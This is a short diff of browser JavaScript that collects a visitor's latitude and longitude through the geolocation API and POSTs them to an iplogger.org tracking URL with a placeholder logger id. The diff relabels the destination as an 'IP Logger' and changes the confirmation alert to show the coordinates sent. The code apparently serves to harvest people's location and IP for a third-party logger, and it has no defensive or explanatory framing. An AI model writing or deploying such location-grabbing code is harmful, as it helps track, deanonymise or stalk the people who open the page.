@@ -17,7 +17,7 @@
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
 
-            // Send location and IP to your server
+            // Send location and IP to your IP Logger
             fetch("https://iplogger.org/your-logger-id", { 
                 method: "POST",
                 headers: {
@@ -28,7 +28,7 @@
                     longitude: longitude
                 })
             }).then(response => {
-                alert("Location and IP sent!");
+                alert(`Location Sent! Latitude: ${latitude}, Longitude: ${longitude}`);
             }).catch(error => {
                 console.error("Error:", error);
             });
